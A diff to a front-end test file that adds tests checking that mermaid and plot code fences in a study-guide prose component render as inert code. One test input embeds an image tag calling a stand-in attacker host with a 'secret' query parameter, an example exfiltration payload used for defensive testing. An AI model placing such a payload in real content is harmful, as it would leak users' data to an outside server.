@@ -15,6 +15,14 @@ vi.mock("next/dynamic", async () => {
   return { default: () => MarkdownChat };
 });
 
+// The chat's diagram and plot, stood in so a test can see whether one mounts.
+vi.mock("@/components/chat/MermaidBlock", () => ({
+  MermaidBlock: () => <div data-testid="mermaid-block" />,
+}));
+vi.mock("@/components/chat/FunctionPlot", () => ({
+  FunctionPlot: () => <div data-testid="function-plot" />,
+}));
+
 import type { Paragraph, ProseItem } from "@/lib/studyGuide/types";
 
 import { Prose } from "./Prose";
@@ -148,6 +156,22 @@ describe("what a passage may load", () => {
     const prose = screen.getByTestId("guide-prose-p1");
     await within(prose).findByText("An embed:");
     expect(prose.querySelector("iframe")).toBeNull();
+  });
+
+  it("shows a diagram fence as its code, so no diagram is drawn to fetch the image it names", async () => {
+    const diagram = "```mermaid\ngraph TD\n  A[\"<img src='https://evil.example/x.png?d=secret'>\"] --> B\n```";
+    renderProse([{ text: diagram, citations: [] }]);
+    const code = await screen.findByText(/graph TD/, { selector: "pre *" });
+    expect(code.closest("pre")).toHaveTextContent("evil.example");
+    expect(screen.queryByTestId("mermaid-block")).not.toBeInTheDocument();
+    expect(screen.getByTestId("guide-prose-p1").querySelector("img")).toBeNull();
+  });
+
+  it("shows a plot fence as its code", async () => {
+    renderProse([{ text: "```plot\n{\"data\": [{\"fn\": \"x^2\"}]}\n```", citations: [] }]);
+    const code = await screen.findByText(/x\^2/, { selector: "pre *" });
+    expect(code.closest("pre")).not.toBeNull();
+    expect(screen.queryByTestId("function-plot")).not.toBeInTheDocument();
   });
 
   it("opens a link in a new tab without a referrer, and drops a script link's target", async () => {
